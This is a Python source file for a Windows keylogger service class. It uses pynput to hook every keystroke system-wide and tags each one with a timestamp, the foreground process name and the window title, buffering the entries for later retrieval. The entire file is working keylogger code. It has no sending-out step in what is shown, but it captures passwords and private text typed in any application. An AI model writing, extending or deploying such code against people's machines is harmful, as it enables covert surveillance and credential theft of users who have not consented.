import threading
import time
from pynput import keyboard
import win32gui
import win32process
import psutil
from interfaces.ikeyLogger import Ikeylogger

class Keyloggerservice(Ikeylogger):
    NUMPAD_VK_MAP = {
        96: '0', 97: '1', 98: '2', 99: '3',
        100: '4', 101: '5', 102: '6', 103: '7',
        104: '8', 105: '9', 110: '.'
    }

    def __init__(self):
        self.logged_keys = []
        self.listener = None
        self.lock = threading.Lock()

    # פונקציה לזיהוי החלון הפעיל
    def get_active_window(self):
        try:
            hwnd = win32gui.GetForegroundWindow()
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            process = psutil.Process(pid)
            exe_name = process.name()
            window_title = win32gui.GetWindowText(hwnd)
            return exe_name, window_title
        except Exception:
            return "Unknown", "Unknown"

    # טיפול במקשים מיוחדים
    def special_tag(self, key):
        if hasattr(key, 'char') and key.char is not None:
            return key.char
        elif hasattr(key, 'vk') and key.vk in self.NUMPAD_VK_MAP:
            return self.NUMPAD_VK_MAP[key.vk]
        elif key == keyboard.Key.space:
            return ' '
        elif key == keyboard.Key.enter:
            return '\n'
        elif key == keyboard.Key.tab:
            return '[TAB]'
        elif key == keyboard.Key.backspace:
            return '[BACKSPACE]'
        elif key == keyboard.Key.shift:
            return ''
        elif key == keyboard.Key.ctrl_r or key == keyboard.Key.ctrl_l:
            return '<ctl>'
        else:
            return f'[{key}]'

    # קריאה בכל הקשה
    def _on_press(self, key):
        try:
            with self.lock:
                exe, window = self.get_active_window()
                entry = f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {exe} - {window} : {self.special_tag(key)}"
                self.logged_keys.append(entry)
        except Exception:
            pass

    def start_logging(self):
        with self.lock:
            self.logged_keys = []
        self.listener = keyboard.Listener(on_press=self._on_press)
        self.listener.start()

    def stop_logging(self):
        if self.listener:
            self.listener.stop()
            self.listener = None

    def get_logged_keys(self):
        with self.lock:
            keys_copy = self.logged_keys.copy()
            self.logged_keys.clear()
        return keys_copy

